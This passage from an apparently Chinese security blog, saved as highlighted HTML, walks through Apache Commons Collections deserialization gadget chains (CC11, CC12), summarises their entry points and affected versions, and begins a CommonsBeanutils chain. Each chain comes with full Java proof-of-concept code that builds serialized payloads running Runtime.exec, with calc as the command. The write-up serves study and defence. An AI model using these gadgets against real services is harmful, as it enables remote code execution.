Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>);<br>        Field tableF = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] table =(Object[]) tableF.get(ht);<br>        Object entry = table[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(entry==<span class="hljs-keyword">null</span>)&#123;<br>            entry = table[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyF = entry.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(entry,tiedMapEntry);<br>        Field iTransformers = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformers.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections11"><a href="#CommonsCollections11" class="headerlink" title="CommonsCollections11"></a>CommonsCollections11</h2><h3 id="Pre-10"><a href="#Pre-10" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-10"><a href="#限制-10" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="关键类-10"><a href="#关键类-10" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><h4 id="利用链-10"><a href="#利用链-10" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-10"><a href="#Gadget-10" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC11;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span> + System.nanoTime());<br>        ctc.setSuperclass(cp.getCtClass(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        InvokerTransformer fakeinvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakeinvokerTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, templatesimpl);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        Field iMethodNameF = InvokerTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        iMethodNameF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iMethodNameF.set(fakeinvokerTransformer, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections12"><a href="#CommonsCollections12" class="headerlink" title="CommonsCollections12"></a>CommonsCollections12</h2><h3 id="Pre-11"><a href="#Pre-11" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-11"><a href="#限制-11" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="关键类-11"><a href="#关键类-11" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ScriptEngineManager</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br></code></pre></td></tr></table></figure><h4 id="利用链-11"><a href="#利用链-11" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span>gey<span class="hljs-constructor">EngineByName()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-constructor">Impl()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-11"><a href="#Gadget-11" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC12;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC12</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(ScriptEngineManager.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;JavaScript&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC-总结"><a href="#CC-总结" class="headerlink" title="CC 总结"></a>CC 总结</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png"></p><p><code>CommonsCollections&lt;=3.2.1</code>下的反序列化利用链的总结：</p><ul><li>起始点<ol><li><code>AnnotationInvocationHandler</code>的<code>readObject</code></li><li><code>BadAttributeValueExpException</code>的<code>readObject</code></li><li><code>HashSet</code>的<code>readObject</code></li><li><code>Hashtable</code>的<code>readObject</code></li></ol></li><li>重要的承接点<ol><li><code>LazyMap</code>的<code>get</code></li><li><code>DefaultedMap</code>的<code>get</code></li><li><code>TiedMapEntry</code>的<code>getValue</code></li><li><code>Proxy</code>的<code>invoke</code></li></ol></li><li>终点<ol><li><code>ChainedTransformer</code>的<code>transform</code></li><li><code>InvokerTransformer</code>的<code>transform</code></li><li><code>ConstantTransformer</code>的<code>transform</code></li></ol></li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">各exp的<span class="hljs-keyword">jdk适用版本</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">jdk7 </span>&gt;= CommonsCollections <span class="hljs-number">1</span>、<span class="hljs-number">3</span><br><span class="hljs-keyword">jdk7 </span>&amp; <span class="hljs-keyword">jdk8 </span>&gt;= CommonsCollections <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br><br>各exp的commons-collections适用版本<br><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="版本更新"><a href="#版本更新" class="headerlink" title="版本更新"></a>版本更新</h3><p>Commons-Collections 4.0 和 Commons-Collections 3.2.1 是两个不同的分支</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>Commons-Collections 4 是官方为了调整架构和 API 设计上的问题推出的项目，不能用来替换 Commons-Collections</p><p>对于 CC1 和 CC3，如果依赖是 Commons-Collections 4.0，<code>LazyMap.decorate</code>需要更换为<code>LazyMap.lazyMap</code></p><p>对于 Commons-Collections 3.2.2，<code>readObject</code>增加了<code>FunctorUtils.checkUnsafeSerialization</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png"></p><p>UNSAFE_SERIALIZABLE_PROPERTY 的值默认为 false，如果需要为 true，需要在运行时指定</p><p>使用 InvokerTransformer 作为反序列化利用链的一部分时，会 throw 一个 exception</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">CloneTransformer</span><br><span class="hljs-keyword"></span>ForClosure<br><span class="hljs-keyword">InstantiateFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">InstantiateTransformer</span><br><span class="hljs-keyword"></span>InvokerTransformer<br>PrototypeCloneFactory<br>PrototypeSerializationFactory<br>WhileClosure<br></code></pre></td></tr></table></figure><p>而 4.1 的修复方式，危险的<code>Transformer</code>不再实现<code>Serializable</code>接口</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 Java 类对 象（也称为 JavaBean）的一些操作方法。</p><h3 id="Pre-12"><a href="#Pre-12" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-12"><a href="#限制-12" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>commons-beanutils</p></blockquote><h4 id="利用链-12"><a href="#利用链-12" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span 